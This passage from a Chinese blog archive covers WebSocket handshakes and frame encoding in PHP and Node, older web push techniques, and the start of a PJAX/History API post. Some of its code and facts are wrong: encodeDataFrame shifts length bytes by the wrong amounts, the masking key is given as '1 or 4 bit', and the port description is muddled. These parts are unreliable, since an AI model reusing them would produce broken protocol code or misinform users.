console.log(&quot;握手成功&quot;);&#125;;ws.onmessage = function(e)&#123; console.log(&quot;message:&quot; + e.data);&#125;;ws.onerror = function()&#123; console.log(&quot;error&quot;);&#125;;ws.send(&quot;李靖&quot;); 在连通之后发送数据，服务器原样返回： 二、注意问题 1. websocket 版本问题 客户端在握手时的请求中有Sec-WebSocket-Version: 13，这样的版本标识，这个是一个升级版本，现在的浏览器都是使用的这个版本。而以前的版本在数据加密的部分更加麻烦，它会发送两个key： 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeOrigin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Key1: xxxxSec-WebSocket-Key2: xxxx 如果是这种版本（比较老，已经没在使用了），需要通过下面的方式获取 123456789101112131415function encry($key1,$key2,$l8b)&#123; //Get the numbers preg_match_all(&apos;/([\d]+)/&apos;, $key1, $key1_num); preg_match_all(&apos;/([\d]+)/&apos;, $key2, $key2_num); $key1_num = implode($key1_num[0]); $key2_num = implode($key2_num[0]); //Count spaces preg_match_all(&apos;/([ ]+)/&apos;, $key1, $key1_spc); preg_match_all(&apos;/([ ]+)/&apos;, $key2, $key2_spc); if($key1_spc==0|$key2_spc==0)&#123; $this-&gt;log(&quot;Invalid key&quot;);return; &#125; //Some math $key1_sec = pack(&quot;N&quot;,$key1_num / $key1_spc); $key2_sec = pack(&quot;N&quot;,$key2_num / $key2_spc); return md5($key1_sec.$key2_sec.$l8b,1);&#125; 只能无限吐槽这种验证方式！相比 nodeJs 的 websocket 操作方式： 1234567891011121314151617181920//服务器程序var crypto = require(&apos;crypto&apos;);var WS = &apos;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&apos;;require(&apos;net&apos;).createServer(function(o)&#123; var key; o.on(&apos;data&apos;,function(e)&#123; if(!key)&#123; //握手 key = e.toString().match(/Sec-WebSocket-Key: (.+)/)[1]; key = crypto.createHash(&apos;sha1&apos;).update(key + WS).digest(&apos;base64&apos;); o.write(&apos;HTTP/1.1 101 Switching Protocols\r\n&apos;); o.write(&apos;Upgrade: websocket\r\n&apos;); o.write(&apos;Connection: Upgrade\r\n&apos;); o.write(&apos;Sec-WebSocket-Accept: &apos; + key + &apos;\r\n&apos;); o.write(&apos;\r\n&apos;); &#125;else&#123; console.log(e); &#125;; &#125;);&#125;).listen(8000); 多么简洁，多么方便！有谁还愿意使用 php 呢。。。。 2. 数据帧解析代码 本文没有给出 decodeFrame 这样数据帧解析代码，前文中给出了数据帧的格式，解析纯属体力活。 3. 代码下载 对这部分感兴趣的同学，可以再去深究。提供了参考代码下载。 4. 相关开源库参考 http://socketo.me Ratchet 为 php 封装的一个 WebSockets 库。 ] Google 上搜索 php+websoket+class，也能找到不少相关的资料。 三、参考资料 http://www.php.net/manual/zh/ref.sockets.php php manualhttp://www.rfc-editor.org/rfc/rfc6455.txt&nbsp;&nbsp;[RFC6455] WebSocket]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>PHP</tag>
        <tag>websocket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[细说WebSocket - Node篇]]></title>
    <url>%2Fblog%2F2013%2F12%2F20%2F2013-12-20-cb-websocket-with-node%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 在上一篇提高到了 web 通信的各种方式，包括 轮询、长连接 以及各种 HTML5 中提到的手段。本文将详细描述 WebSocket协议 在 web通讯 中的实现。一、WebSocket 协议1. 概述websocket协议允许不受信用的客户端代码在可控的网络环境中控制远程主机。该协议包含一个握手和一个基本消息分帧、分层通过TCP。简单点说，通过握手应答之后，建立安全的信息管道，这种方式明显优于前文所说的基于 XMLHttpRequest 的 iframe 数据流和长轮询。该协议包括两个方面，握手链接（handshake）和数据传输（data transfer）。2. 握手连接这部分比较简单，就像路上遇到熟人问好。 123Client：嘿，大哥，有火没？（烟递了过去）Server：哈，有啊，来~ （点上）Client：火柴啊，也行！（烟点上，验证完毕） 握手连接中，client 先主动伸手： 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13 客户端发了一串 Base64 加密的密钥过去，也就是上面你看到的 Sec-WebSocket-Key。 Server 看到 Client 打招呼之后，悄悄地告诉 Client 他已经知道了，顺便也打个招呼。 12345HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=Sec-WebSocket-Protocol: chat Server 返回了 Sec-WebSocket-Accept 这个应答，这个应答内容是通过一定的方式生成的。生成算法是： 12mask = &quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;; // 这是算法中要用到的固定字符串accept = base64( sha1( key + mask ) ); key 和 mask 串接之后经过 SHA-1 处理，处理后的数据再经过一次 Base64 加密。分解动作： 12345671. t = &quot;GhlIHNhbXBsZSBub25jZQ==&quot; + &quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot; -&gt; &quot;GhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;2. s = sha1(t) -&gt; 0xb3 0x7a 0x4f 0x2c 0xc0 0x62 0x4f 0x16 0x90 0xf6 0x46 0x06 0xcf 0x38 0x59 0x45 0xb2 0xbe 0xc4 0xea3. base64(s) -&gt; &quot;s3pPLMBiTxaQ9kYGzzhZRbK+xOo=&quot; 上面 Server 端返回的 HTTP 状态码是 101，如果不是 101 ，那就说明握手一开始就失败了~下面就来个 demo，跟服务器握个手： 1234567891011121314var crypto = require(&apos;crypto&apos;);require(&apos;net&apos;).createServer(function(o)&#123; var key; o.on(&apos;data&apos;,function(e)&#123; if(!key)&#123; // 握手 // 应答部分，代码先省略 console.log(e.toString()); &#125;else&#123; &#125;; &#125;);&#125;).listen(8000); 客户端代码： 1234var ws=new WebSocket(&quot;ws://127.0.0.1:8000&quot;);ws.onerror=function(e)&#123; console.log(e);&#125;; 上面当然是一串不完整的代码，目的是演示握手过程中，客户端给服务端打招呼。在控制台我们可以看到：看起来很熟悉吧，其实就是发送了一个 HTTP 请求，这个我们在浏览器的 Network 中也可以看到：但是 WebSocket协议 并不是 HTTP 协议，刚开始验证的时候借用了 HTTP 的头，连接成功之后的通信就不是 HTTP 了，不信你用 fiddler2 抓包试试，肯定是拿不到的，后面的通信部分是基于 TCP 的连接。服务器要成功的进行通信，必须有应答，往下看： 1234567891011121314151617181920//服务器程序var crypto = require(&apos;crypto&apos;);var WS = &apos;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&apos;;require(&apos;net&apos;).createServer(function(o)&#123; var key; o.on(&apos;data&apos;,function(e)&#123; if(!key)&#123; //握手 key = e.toString().match(/Sec-WebSocket-Key: (.+)/)[1]; key = crypto.createHash(&apos;sha1&apos;).update(key + WS).digest(&apos;base64&apos;); o.write(&apos;HTTP/1.1 101 Switching Protocols\r\n&apos;); o.write(&apos;Upgrade: websocket\r\n&apos;); o.write(&apos;Connection: Upgrade\r\n&apos;); o.write(&apos;Sec-WebSocket-Accept: &apos; + key + &apos;\r\n&apos;); o.write(&apos;\r\n&apos;); &#125;else&#123; console.log(e); &#125;; &#125;);&#125;).listen(8000); 关于crypto模块，可以看看官方文档，上面的代码应该是很好理解的，服务器应答之后，Client 拿到 Sec-WebSocket-Accept ，然后本地做一次验证，如果验证通过了，就会触发 onopen 函数。 12345//客户端程序var ws=new WebSocket(&quot;ws://127.0.0.1:8000/&quot;);ws.onopen=function(e)&#123; console.log(&quot;握手成功&quot;);&#125;; 可以看到3. 数据帧格式官方文档提供了一个结构图 123456789101112131415161718 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-------+-+-------------+-------------------------------+|F|R|R|R| opcode|M| Payload len | Extended payload length ||I|S|S|S| (4) |A| (7) | (16/64) ||N|V|V|V| |S| | (if payload len==126/127) || |1|2|3| |K| | |+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +| Extended payload length continued, if payload len == 127 |+ - - - - - - - - - - - - - - - +-------------------------------+| |Masking-key, if MASK set to 1 |+-------------------------------+-------------------------------+| Masking-key (continued) | Payload Data |+-------------------------------- - - - - - - - - - - - - - - - +: Payload Data continued ... :+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +| Payload Data continued ... |+---------------------------------------------------------------+ 第一眼瞟到这张图恐怕是要吐血，如果大学修改计算机网络这门课应该不会对这东西陌生，数据传输协议嘛，是需要定义字节长度及相关含义的。 123456789FIN 1bit 表示信息的最后一帧，flag，也就是标记符RSV 1-3 1bit each 以后备用的 默认都为 0Opcode 4bit 帧类型，稍后细说Mask 1bit 掩码，是否加密数据，默认必须置为1 （这里很蛋疼）Payload 7bit 数据的长度Masking-key 1 or 4 bit 掩码Payload data (x + y) bytes 数据Extension data x bytes 扩展数据Application data y bytes 程序数据 每一帧的传输都是遵从这个协议规则的，知道了这个协议，那么解析就不会太难了，下面我就直接拿了次碳酸钴同学的代码。4. 数据帧的解析和编码数据帧的解析代码： 1234567891011121314151617181920212223242526272829function decodeDataFrame(e)&#123; var i=0,j,s,frame=&#123; //解析前两个字节的基本数据 FIN:e[i]&gt;&gt;7,Opcode:e[i++]&amp;15,Mask:e[i]&gt;&gt;7, PayloadLength:e[i++]&amp;0x7F &#125;; //处理特殊长度126和127 if(frame.PayloadLength==126) frame.length=(e[i++]&lt;&lt;8)+e[i++]; if(frame.PayloadLength==127) i+=4, //长度一般用四字节的整型，前四个字节通常为长整形留空的 frame.length=(e[i++]&lt;&lt;24)+(e[i++]&lt;&lt;16)+(e[i++]&lt;&lt;8)+e[i++]; //判断是否使用掩码 if(frame.Mask)&#123; //获取掩码实体 frame.MaskingKey=[e[i++],e[i++],e[i++],e[i++]]; //对数据和掩码做异或运算 for(j=0,s=[];j&lt;frame.PayloadLength;j++) s.push(e[i+j]^frame.MaskingKey[j%4]); &#125;else s=e.slice(i,frame.PayloadLength); //否则直接使用数据 //数组转换成缓冲区来使用 s=new Buffer(s); //如果有必要则把缓冲区转换成字符串来使用 if(frame.Opcode==1)s=s.toString(); //设置上数据部分 frame.PayloadData=s; //返回数据帧 return frame;&#125; 数据帧的编码： 12345678910111213141516//NodeJSfunction encodeDataFrame(e)&#123; var s=[],o=new Buffer(e.PayloadData),l=o.length; //输入第一个字节 s.push((e.FIN&lt;&lt;7)+e.Opcode); //输入第二个字节，判断它的长度并放入相应的后续长度消息 //永远不使用掩码 if(l&lt;126)s.push(l); else if(l&lt;0x10000)s.push(126,(l&amp;0xFF00)&gt;&gt;2,l&amp;0xFF); else s.push( 127, 0,0,0,0, //8字节数据，前4字节一般没用留空 (l&amp;0xFF000000)&gt;&gt;6,(l&amp;0xFF0000)&gt;&gt;4,(l&amp;0xFF00)&gt;&gt;2,l&amp;0xFF ); //返回头部分和数据部分的合并缓冲区 return Buffer.concat([new Buffer(s),o]);&#125; 有些童鞋可能没有明白，应该解析哪些数据。这的解析任务主要是服务端处理，客户端送过去的数据是二进制流形式的，比如：&nbsp; 1var ws = new WebSocket(&quot;ws://127.0.0.1:8000/&quot;); ws.onopen = function()&#123; ws.send(&quot;握手成功&quot;); &#125;; Server 收到的信息是这样的：一个放在Buffer格式的二进制流。而当我们输出的时候解析这个二进制流： 123456789101112131415161718192021//服务器程序var crypto = require(&apos;crypto&apos;);var WS = &apos;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&apos;;require(&apos;net&apos;).createServer(function(o)&#123; var key; o.on(&apos;data&apos;,function(e)&#123; if(!key)&#123; //握手 key = e.toString().match(/Sec-WebSocket-Key: (.+)/)[1]; key = crypto.createHash(&apos;sha1&apos;).update(key + WS).digest(&apos;base64&apos;); o.write(&apos;HTTP/1.1 101 Switching Protocols\r\n&apos;); o.write(&apos;Upgrade: websocket\r\n&apos;); o.write(&apos;Connection: Upgrade\r\n&apos;); o.write(&apos;Sec-WebSocket-Accept: &apos; + key + &apos;\r\n&apos;); o.write(&apos;\r\n&apos;); &#125;else&#123; // 输出之前解析帧 console.log(decodeDataFrame(e)); &#125;; &#125;);&#125;).listen(8000); 那输出的就是一个帧信息十分清晰的对象了：5. 连接的控制上面我买了个关子，提到的Opcode，没有详细说明，官方文档也给了一张表： 1234567891011121314 |Opcode | Meaning | Reference |-+--------+-------------------------------------+-----------| | 0 | Continuation Frame | RFC 6455 |-+--------+-------------------------------------+-----------| | 1 | Text Frame | RFC 6455 |-+--------+-------------------------------------+-----------| | 2 | Binary Frame | RFC 6455 |-+--------+-------------------------------------+-----------| | 8 | Connection Close Frame | RFC 6455 |-+--------+-------------------------------------+-----------| | 9 | Ping Frame | RFC 6455 |-+--------+-------------------------------------+-----------| | 10 | Pong Frame | RFC 6455 |-+--------+-------------------------------------+-----------| decodeDataFrame 解析数据，得到的数据格式是： 12345678&#123; FIN: 1, Opcode: 1, Mask: 1, PayloadLength: 4, MaskingKey: [ 159, 18, 207, 93 ], PayLoadData: &apos;握手成功&apos;&#125; 那么可以对应上面查看，此帧的作用就是发送文本，为文本帧。因为连接是基于 TCP 的，直接关闭 TCP 连接，这个通道就关闭了，不过 WebSocket 设计的还比较人性化，关闭之前还跟你打一声招呼，在服务器端，可以判断frame的Opcode： 12345var frame=decodeDataFrame(e);console.log(frame);if(frame.Opcode==8)&#123; o.end(); //断开连接&#125; 客户端和服务端交互的数据（帧）格式都是一样的，只要客户端发送 ws.close()， 服务器就会执行上面的操作。相反，如果服务器给客户端也发送同样的关闭帧(close frame)： 12345o.write(encodeDataFrame(&#123; FIN:1, Opcode:8, PayloadData:buf&#125;)); 客户端就会相应 onclose 函数，这样的交互还算是有规有矩，不容易出错。二、注意事项1. WebSocket URIs很多人可能只知道&nbsp;ws://text.com:8888，但事实上 websocket 协议地址是可以加 path 和 query 的。 12ws-URI = &quot;ws:&quot; &quot;//&quot; host [ &quot;:&quot; port ] path [ &quot;?&quot; query ]wss-URI = &quot;wss:&quot; &quot;//&quot; host [ &quot;:&quot; port ] path [ &quot;?&quot; query ] 如果使用的是 wss 协议，那么 URI 将会以安全方式连接。 这里的 wss 大小写不敏感。2. 协议中”多余”的部分（吐槽）握手请求中包含Sec-WebSocket-Key字段，明眼人一下就能看出来是websocket连接，而且这个字段的加密方式在服务器也是固定的，如果别人想黑你，不会太难。再就是那个 MaskingKey 掩码，既然强制加密了（Mask为1表示加密，加密方式就是 MaskingKey 与 PayLoadData 进行异或处理），还有必要让开发者处理这个东西么？直接封装到内部不就行了？3. 与 TCP 和 HTTP 之间的关系WebSocket协议是一个基于TCP的协议，就是握手链接的时候跟HTTP相关（发了一个HTTP请求），这个请求被Server切换到（Upgrade）websocket协议了。websocket把 80 端口作为默认websocket连接端口，而websocket的运行使用的是443端口。三、参考资料http://tools.ietf.org/html/rfc6455 web standard - The WebSocket Protocolhttp://www.w3.org/TR/websockets/ W3.ORG - WebSockets四、特别感谢再次感谢 次碳酸钴 跟我交流了几个小时 : )，本文部分 node 代码参考自他的博客。 下次将以php作为后台，讲解websocket的相关知识。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>websocket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript之web通信]]></title>
    <url>%2Fblog%2F2013%2F12%2F17%2F2013-12-17-cb-web-communication%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. web通信，一个特别大的topic，涉及面也是很广的。因最近学习了 javascript 中一些 web 通信知识，在这里总结下。文中应该会有理解错误或者表述不清晰的地方，还望斧正！一、前言1. comet技术浏览器作为 Web 应用的前台，自身的处理功能比较有限。浏览器的发展需要客户端升级软件，同时由于客户端浏览器软件的多样性，在某种意义上，也影响了浏览器新技术的推广。在 Web 应用中，浏览器的主要工作是发送请求、解析服务器返回的信息以不同的风格显示。AJAX 是浏览器技术发展的成果，通过在浏览器端发送异步请求，提高了单用户操作的响应性。但 Web 本质上是一个多用户的系统，对任何用户来说，可以认为服务器是另外一个用户。现有 AJAX 技术的发展并不能解决在一个多用户的 Web 应用中，将更新的信息实时传送给客户端，从而用户可能在\过时”的信息下进行操作。而 AJAX 的应用又使后台数据更新更加频繁成为可能。随着互联网的发展，web 应用层出不穷，也不乏各种网站监控、即时报价、即时通讯系统，为了让用户得到更好的体验，服务器需要频繁的向客户端推送信息。开发者一般会采用基于 AJAX 的长轮询方式或者基于 iframe 及 htmlfile 的流方式处理。当然有些程序需要在客户端安装各种插件( Java applet 或者 Flash )来支持性能比较良好的\推”信息。2. HTTP协议中的长、短连接短连接的操作步骤是：建立连接&mdash;&mdash;数据传输&mdash;&mdash;关闭连接…建立连接&mdash;&mdash;数据传输&mdash;&mdash;关闭连接长连接的操作步骤是：建立连接&mdash;&mdash;数据传输…（保持连接）…数据传输&mdash;&mdash;关闭连接 长连接与短连接的不同主要在于client和server采取的关闭策略不同。短连接在建立连接以后只进行一次数据传输就关闭连接，而长连接在建立连接以后会进行多次数据数据传输直至关闭连接（长连接中关闭连接通过Connection：closed头部字段）。二、web 通信首先要搞清楚，xhr 的 readystate 各种状态。属性 描述onreadystatechange 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。 0: 请求未初始化 1: 服务器连接已建立 2: 请求已接收3: 请求处理中 4: 请求已完成，且响应已就绪status 200: “OK” 404: 未找到页面&nbsp;1.轮询轮询是一种\拉”取信息的工作模式。设置一个定时器，定时询问服务器是否有信息，每次建立连接传输数据之后，链接会关闭。前端实现： 123456789101112131415161718192021var polling = function(url, type, data)&#123; var xhr = new XMLHttpRequest(), type = type || &quot;GET&quot;, data = data || null; xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4) &#123; receive(xhr.responseText); xhr.onreadystatechange = null; &#125; &#125;; xhr.open(type, url, true); //IE的ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)支持GET方法发送数据， //其它浏览器不支持，已测试验证 xhr.send(type == &quot;GET&quot; ? null : data);&#125;;var timer = setInterval(function()&#123; polling();&#125;, 1000); 在轮询的过程中，如果因为网络原因，导致上一个 xhr 对象还没传输完毕，定时器已经开始了下一个询问，上一次的传输是否还会在队列中，这个问题我没去研究。如果感兴趣可以自己写一个ajax的请求管理队列。2.长轮询(long-polling)长轮询其实也没啥特殊的地方，就是在xhr对象关闭连接的时候马上又给他接上~ 看码： 12345678910111213141516var longPoll = function(type, url)&#123; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function()&#123; // 状态为 4，数据传输完毕，重新连接 if(xhr.readyState == 4) &#123; receive(xhr.responseText); xhr.onreadystatechange = null; longPoll(type, url); &#125; &#125;; xhr.open(type, url, true); xhr.send();&#125; 只要服务器断开连接，客户端马上连接，不让他有一刻的休息时间，这就是长轮询。3.数据流数据流方式，在建立的连接断开之前，也就是 readystate 状态为 3 的时候接受数据，但是麻烦的事情也在这里，因为数据正在传输，你拿到的 xhr.response 可能就是半截数据，所以呢，最好定义一个数据传输的协议，比如前2个字节表示字符串的长度，然后你只获取这个长度的内容，接着改变游标的位置。假如数据格式为： data splitChar &nbsp; data为数据内容，splitChar为数据结束标志（长度为1）。 那么传输的数据内容为 data splitChar data splitChar data splitChar… 123456789101112131415161718192021222324252627282930313233var dataStream = function(type, url)&#123; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function()&#123; // 状态为 3，数据接收中 if(xhr.readyState == 3) &#123; var i, l, s; s = xhr.response; //读取数据 l = s.length; //获取数据长度 //从游标位置开始获取数据，并用分割数据 s = s.slice(p, l - 1).split(splitChar); //循环并操作数据 for(i in s) if(s[i]) deal(s[i]); p = l; //更新游标位置 &#125; // 状态为 4，数据传输完毕，重新连接 if(xhr.readyState == 4) &#123; xhr.onreadystatechange = null; dataStream(type, url); &#125; &#125;; xhr.open(type, url, true); xhr.send();&#125;; 这个代码写的是存在问题的，当readystate为3的时候可以获取数据，但是这时获取的数据可能只是整体数据的一部分，那后半截就拿不到了。readystate在数据传输完毕之前是不会改变的，也就是说他并不会继续接受剩下的数据。我们可以定时去监听readystate，这个下面的例子中可以看到。这样的处理不算复杂，但是存在问题。上面的轮询和长轮询是所有浏览器都支持的，所以我就没有写兼容IE的代码，但是这里，低版本IE不允许在readystate为3的时候读取数据，所以我们必须采用其他的方式来实现。在ajax还没有进入web专题之前，我们已经拥有了一个法宝，那就是iframe，利用iframe照样可以异步获取数据，对于低版本IE可以使用iframe来接受数据流。 123456789101112131415161718192021222324if(isIE)&#123; var dataStream = function(url)&#123; var ifr = document.createElement(&quot;iframe&quot;), doc, timer; ifr.src = url; document.body.appendChild(ifr); doc = ifr.contentWindow.document; timer = setInterval(function()&#123; if(ifr.readyState == &quot;interactive&quot;)&#123; // 处理数据，同上 &#125; // 重新建立链接 if(ifr.readyState == &quot;complete&quot;)&#123; clearInterval(timer); dataStream(url); &#125; &#125;, 16); &#125;;&#125;; 定时去监听iframe的readystate的变化，从而获取数据流，不过，上面的处理方式还是存在问题。数据流实现\服务器推”数据的原理是什么呢，简单点说，就是文档(数据)还没有加载完，这个时候浏览器的工作就是去服务器拿数据完成文档(数据)加载，我们就是利用这点，给浏览器塞点东西过去~ 所以上述利用iframe的方式获取数据，会使浏览器一直处于加载状态，title上的那个圈圈一直在转动，鼠标的状态也是loading，这看着是相当不爽的。幸好，IE提供了HTMLFile对象，这个对象就相当于一个内存中的Document对象，它会解析文档。所以我们创建一个HTMLFile对象，在里面放置一个IFRAME来连接服务器。这样，各种浏览器就都支持了。 12345678910111213141516171819202122232425262728if(isIE)&#123; var dataStream = function(url)&#123; var doc = new ActiveXObject(&quot;HTMLFile&quot;), ifr = doc.createElement(&quot;iframe&quot;), timer, d; doc.write(&quot;&lt;body&gt;&quot;); ifr.src = url; doc.body.appendChild(ifr); d = ifr.contentWindow.document; timer = setInterval(function()&#123; if(d.readyState == &quot;interactive&quot;)&#123; // 处理数据，同上 &#125; // 重新建立链接 if(d.readyState == &quot;complete&quot;)&#123; clearInterval(timer); dataStream(url); &#125; &#125;, 16); &#125;;&#125;; 4.websocket websocket是前端一个神器，ajax用了这么久了，相关技术也是很成熟，不过要实现个数据的拉取确实十分不易，从上面的代码中也看到了，各种兼容性问题，各种细节处理问题，自从有了websocket，哈哈，一口气上五楼… 123456789var ws = new WebSocket(&quot;ws://www.example.com:8888&quot;);ws.onopen = function(evt)&#123;&#125;;ws.onmessage = function(evt)&#123; deal(evt.data);&#125;;ws.onclose = function(evt)&#123;&#125;;//ws.close(); 新建一个WebSocket实例，一切就OK了，ws:// 是websocket的连接协议，8888为端口号码。onmessage中提供了data这个属性，相当方便5.EventSourceHTML5中提供的EventSource这玩意儿，这是无比简洁的服务器推送信息的接受函数。 123new EventSource(&quot;test.php&quot;).onmessage=function(evt)&#123; console.log(evt.data);&#125;; 简洁程度和websocket是一样的啦，只是这里有一个需要注意的地方，test.php输出的数据流应该是特殊的MIME类型，要求是”text/event-stream”，如果不设置的话，你试试~ （直接抛出异常）6.ActionScript情非得已就别考虑这第六种方式了，虽说兼容性最好，要是不懂as，出了点bug你也不会调试。具体实现方法：在 HTML 页面中内嵌入一个使用了 XMLSocket 类的 Flash 程序。JavaScript 通过调用此 Flash 程序提供的套接口接口与服务器端的套接口进行通信。JavaScript 在收到服务器端以 XML 格式传送的信息后可以很容易地控制 HTML 页面的内容显示。7.Java Applet套接口这玩意儿原理和Flash类似，不过我不懂，就不细说了。三、后端处理方式本文主要是总结Javascript的各种通讯方式，后端配合node来处理，应该是挺给力的。 123456789101112131415161718var conns = new Array();var ws = require(&quot;websocket-server&quot;);var server = ws.createServer();server.addListener(&quot;connection&quot;, function(connection)&#123; console.log(&quot;Connection request on Websocket-Server&quot;); conns.push(connection); connection.addListener(&apos;message&apos;,function(msg)&#123; console.log(msg); for(var i=0; i&lt;conns.length; i++)&#123; if(conns[i]!=connection)&#123; conns[i].send(msg); &#125; &#125; &#125;);&#125;);server.listen(8888); 下面是一个php的测试demo。 123456header(&apos;Content-Type:text/html; charset=utf-8&apos;);while(1)&#123; echo date(&apos;Y-m-d H:i:s&apos;); flush(); sleep(1);&#125;; 四、web 通信方式利弊分析 轮询，这种方式应该是最没技术含量的，操作起来最方便，不过是及时性不强，把定时器的间隔时间设置的短一些可以稍微得到缓和。长轮询，算是比较不错的一个web通讯方式，不过每次断开连接，比较耗服务器资源，客户端到无所谓。数据流，他和长轮询不同之处是接受数据的时间不一样，数据流是readystate为3的时候接受，低版本IE不太兼容，处理起来略麻烦，而且还要自己设计数据传输协议。不过他对资源的消耗比上面几种都可观。websocket和EventSource，两个利器，不过，没几个浏览器支持，这是比较让人伤心~ActionScript和Java Applet，两者都是需要在客户端安装插件的，一个是Flash插件，一个是Java插件，而且搞前端的人一般对这东西不太熟悉，如果没有封装比较好的库可以使用，那建议还是别用了。五、参考资料http://www.ibm.com/developerworks/cn/web/wa-lo-comet/ Comet：基于 HTTP 长连接的\服务器推”技术http://blog.csdn.net/yankai0219/article/details/8208776 HTTP协议中长连接、短连接http://www.web-tinker.com/ comet系列文章 推荐订阅]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PJAX的实现与应用]]></title>
    <url>%2Fblog%2F2013%2F12%2F06%2F2013-12-06-cb-history-api-in-html5%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 一、前言 web发展经历了一个漫长的周期，最开始很多人认为Javascript这们语言是前端开发的累赘，是个鸡肋，那个时候人们还享受着从一个a链接蹦到另一个页面的web神奇魔术。后来随着JavaScript的不断更新换代，他的功能不仅仅是为网页添加一点特效了，语言本身的加强以及对DOM操作能力的提升让他在前端大放光彩。尤其是ajax的出现，让JavaScript以及整个web的发展翻开了崭新的一页。利用ajax局部刷新页面，相信很多人玩得相当熟练了。如果整个页面的刷新都是使用ajax，我们可以称之为一个webapp，所有的逻辑都是在当页处理，这种形式的页面带来的体验是十分不错的，减少了那些比较\冗余”的页面跳转、新开页面等。不过，webapp的代码是十分不好维护的，页面逻辑太多太深，出点小问题，整个页面就会瘫痪，而且不方便定位bug，可维护性很低。二、PJAX的实现与应用1.场景再现-ajax弊端ajax是一个非常好玩的小东西，不过用起来也会存在一些问题。我们可以利用ajax进行无刷新改变文档内容，但是没办法去修改URL，有童鞋要问，这里为什么一定要修改URL呢？一个URL代表一个特定的网络资源，ajax修改了页面的内容，所以用不同的URL去标识他们，这个还是挺有必要的。比如我们设计了一个单词查询的页面，比较合理的UR应该是http://example.com/word，不同的word对应不同的内容，但是如果整个页面都是ajax实现，我们就没法去修改/word了，当然我们可以使用hash如http://example.com#word，但这样就不能很好的处理浏览器的前进和后退问题。如：在页面中查询了单词A的翻译，接着又查询了单词B，这个时候浏览器的浏览历史会生成http://example.com#A和http://example.com#B两个记录，可是当我们从B转回A的时候，AJAX的效果还停留在B的状态（页面显示的还是单词B的翻译）。部分浏览器对此问题引入了onhashchange的接口，只要URL的hash值发生变化，我们的程序就可以监听并做出相应。不过对于那些木有这个接口的浏览器，就得定时去判断hash的变化了。而这样的方式对搜索引擎是十分不友好的，twitter和google约定使用hash bang (#!xxx)，也就是hash后面的第一个字符为感叹号，这样的网址他们是会爬取的，但是其他搜索引擎不支持。PJAX可以在改变页面内容的同时也改变他的URL，下面来说说PJAX和他的应用。2.什么是PJAXhistory API中有几个新特性，分别是history.pushState和history.replaceState，我们把pushState+AJAX进行封装，合起来简单点叫，就是PJAX~ 虽说实现技术上没什么新东西，但是概念上还是有所不同的。PJAX的基本思路是，用户点击一个链接，通过ajax更新页面变化的部分，然后使用HTML5的pushState修改浏览器的URL地址，这样有效地避免了整个页面的重新加载。如果浏览器不支持history的两个新API或者JS被禁用了，那这个链接就只能跳转并重新刷新整个页面了。和传统的ajax设计稍微不同，ajax通常是从后台获取JSON数据，然后由前端解析渲染，而PJAX请求的是一个在服务器上生成好的HTML碎片，如下图所示：客户端向服务器发送一个普通的请求（1），其实也就是点击了一个链接，服务器会相应这个请求（2），返回一个html文档。客户端向服务器发送一个有PJAX标志的请求（3），此时服务器只返回一个html碎片（4）。但是这两次请求都让客户端的URL变化了，希望上面的说明可以让你明白了PAJX和AJAX的区别了。3.PJAX的实现先看一个小DEMO吧，这个DEMO也写了我半个多小时，看之前先说明一下，打开你的现代浏览器（chrome，Firefox，opera，IE9+等），进入gallery页面，查看图片的时候注意观察浏览器的title和url变化，点击前进后退按钮也注意查看其变化。我已经在浏览历史管理中push了三条历史记录。DEMO地址：http://qianduannotes.duapp.com/demo/PJAX/index.html如果你还没有理解上面说的PJAX和AJAX的区别，看完这个demo，你应该有所领悟吧！在URL变化之后，页面并没有刷新，而是继续完成自己的动画（demo中为fadeOut）。在HTML4，Histroy对象有下面属性方法：length：历史堆栈中的记录数。back()：返回上一页。forward()：前进到下一页。go([delta])：delta是个数字，如果不写或为0，则刷新本页；如果为正数，则前进到相应数目的页面；若为负数，则后退到相应数目的页面。在HTML5中，新增了两个方法：pushState(data, title [, url])：往历史堆栈的顶部添加一条记录。data为一个对象或null，它会在触发window的popstate事件（window.onpopstate）时，作为参数的state属性传递过去；title为页面的标题，但当前所有浏览器都忽略这个参数；url为页面的URL，不写则为当前页。replaceState(data, title [, 